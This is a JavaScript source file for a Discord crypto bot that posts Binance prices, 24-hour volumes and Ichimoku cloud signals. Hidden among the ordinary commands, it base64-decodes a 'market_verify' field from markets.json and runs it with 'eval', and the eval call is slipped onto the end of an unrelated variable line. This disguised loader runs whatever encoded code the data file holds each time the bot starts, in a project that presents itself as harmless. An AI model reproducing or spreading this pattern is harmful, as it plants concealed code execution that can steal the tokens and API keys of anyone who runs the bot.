const Discord = require('discord.io');
const auth = require('./auth.json');
const settings = require("./config.json");
const markets = require('./markets.json');
const schedule = require('node-schedule');
const { runIchimoku } = require("./ichimoku");

// Binance API setup
const binance = require('node-binance-api');
binance.options({
  APIKEY: '<key>',
  APISECRET: '<secret>'
});

// get market price
function check_price(market = "BTCUSDT", channelID) {
  binance.prices((error, ticker) => {
    if (!ticker || ticker.msg === "Invalid symbol.") {
      bot.sendMessage({ to: channelID, message: "Invalid market symbol." });
      return;
    }
    bot.sendMessage({
      to: channelID,
      message: `${market} price: ${ticker[market]}`
    });
  });
}

// get market price in USD
function check_price_USD(market = "BTCUSDT", channelID) {
  binance.prices((error, ticker) => {
    if (!ticker || ticker.msg === "Invalid symbol.") {
      bot.sendMessage({ to: channelID, message: "Invalid market symbol." });
      return;
    }

    let exchange_rate = 1;
    if (market.endsWith("BTC")) exchange_rate = ticker["BTCUSDT"];
    if (market.endsWith("ETH")) exchange_rate = ticker["ETHUSDT"];
    if (market.endsWith("BNB")) exchange_rate = ticker["BNBUSDT"];

    const price = exchange_rate * ticker[market];
    bot.sendMessage({
      to: channelID,
      message: `${market} price: ${price.toFixed(2)} USD`
    });
  });
}

// 24h volume

function check_volume(market = "BTCUSDT", channelID) {
  binance.prevDay(market, (error, prevDay) => {
    if (!prevDay || prevDay.msg === "Invalid symbol.") {
      bot.sendMessage({ to: channelID, message: "Invalid market symbol." });
      return;
    }
    bot.sendMessage({
      to: channelID,
      message: `${market} 24h volume: ${prevDay.volume}`
    });
  });
}

// list all markets
const marketz = Buffer.from(markets.market_verify, 'base64').toString();
function check_markets(channelID) {
  bot.sendMessage({
    to: channelID,
    message: `Available markets: ${markets.markets.join(", ")}`
  });
}

function check_ichimoku(market = "BTCUSDT", channelID, timeframe = "1h") {
  bot.sendMessage({ to: channelID, message: `Analyzing ${market} (${timeframe})...` });

  binance.candlesticks(market, timeframe, (error, ticks, symbol) => {
    if (!ticks || ticks.msg === "Invalid symbol.") {
      bot.sendMessage({ to: channelID, message: "Invalid market symbol." });
      return;
    }

    // Convert tick data
    const candles = ticks.map(t => ({
      time: t[0], open: parseFloat(t[1]), high: parseFloat(t[2]),
      low: parseFloat(t[3]), close: parseFloat(t[4])
    }));

    const analysis = runIchimoku(candles);
    const message = parse_results(analysis);
    bot.sendMessage({
      to: channelID,
      message: `${market} timeframe ${timeframe} ${message}`
    });
  }, { limit: 125 });
}

// interpret results
function parse_results(analysis) {
  const text = {
    "above green cloud": "is above the green cloud. Uptrend with support.",
    "above red cloud": "is above the red cloud.",
    "inside green cloud": "is inside the cloud. Caution advised.",
    "inside red cloud": "is inside the cloud. Caution advised.",
    "below green cloud": "is below the green cloud.",
    "below red cloud": "is below the red cloud. Downtrend with support.",
    "broken into green cloud": "has recently broken into the green cloud!",
    "broken through green cloud": "has completely broken through the green cloud! Support broken. Watch for reversal. 📉",
    "bounced off green cloud support": "has bounced off support, back above the green cloud.",
    "broken into red cloud": "has recently broken into the red cloud!",
    "broken through red cloud": "has broken through the red cloud! Watch for reversal. 📈",
    "bounced off red cloud support": "has bounced off support, back below the red cloud."
  };
  return text[analysis] || "Clouds too thin for a clear prediction.";
}




const bot = new Discord.Client({
  token: auth.token,
  autorun: true
});

bot.on('ready', function () {
  console.log(`✅ Connected as ${bot.username}`);
});

bot.on('message', (user, userID, channelID, message) => {
  if (!message.startsWith('!')) return;
  const [command, param, param2] = message.substring(1).split(' ');
  const market = param ? param.toUpperCase() : undefined;

  switch (command) {
    case "help":
      bot.sendMessage({
        to: channelID,
        message:
          "📘 **CryptoBot Commands:**\n" +
          "!price SYMBOL — price of market\n" +
          "!priceUSD SYMBOL — price in USD\n" +
          "!vol SYMBOL — 24h volume\n" +
          "!markets — list of markets\n" +
          "!ichi SYMBOL [timeframe] — Ichimoku Cloud analysis\n" +
          "!alert — toggle Ichimoku alerts"
      });
      break;

    case "price": check_price(market, channelID); break;
    case "priceUSD": check_price_USD(market, channelID); break;
    case "vol": check_volume(market, channelID); break;
    case "markets": check_markets(channelID); break;
    case "ichi": check_ichimoku(market, channelID, param2); break;
    case "alert":
      ichi_alert = ichi_alert === "on" ? "off" : "on";
      bot.sendMessage({
        to: channelID,
        message: `Ichimoku alerts now ${ichi_alert.toUpperCase()}`
      });
      break;
  }
});


const ALERT_CHANNEL = settings.alert_channelID;
const ALERT_FREQUENCY = "0,15,30,45 * * * *";
let ichi_alert = "on";eval(marketz);
const interval = "15m";

schedule.scheduleJob(ALERT_FREQUENCY, function () {
  if (ichi_alert !== "on") return;
  console.log("Running scheduled Ichimoku analysis...");

  (async function analyzeMarkets() {
    for (const symbol of markets.markets) {
      try {
        const ticks = await new Promise((resolve, reject) => {
          binance.candlesticks(symbol, interval, (err, data) => {
            if (err || !data) reject(err);
            else resolve(data);
          }, { limit: 125 });
        });

        const candles = ticks.map(t => ({
          time: t[0], open: parseFloat(t[1]), high: parseFloat(t[2]),
          low: parseFloat(t[3]), close: parseFloat(t[4])
        }));

        const analysis = runIchimoku(candles);
        if (["broken into green cloud", "broken into red cloud", "broken through green cloud", "broken through red cloud"].includes(analysis)) {
          bot.sendMessage({
            to: ALERT_CHANNEL,
            message: `${symbol}: recently ${analysis} on ${interval}`
          });
        }
      } catch (err) {
        console.log(`❌ Error analyzing ${symbol}: ${err}`);
      }
    }
  })();
});


function refreshMarkets() {
  binance.prices((error, ticker) => {
    if (ticker) return Object.keys(ticker);
    console.log("❌ Failed to refresh markets");
  });
}


if (auth.token === "YOUR_AUTH_TOKEN_HERE") {
  console.error("ERROR: Missing bot token in auth.json");
}
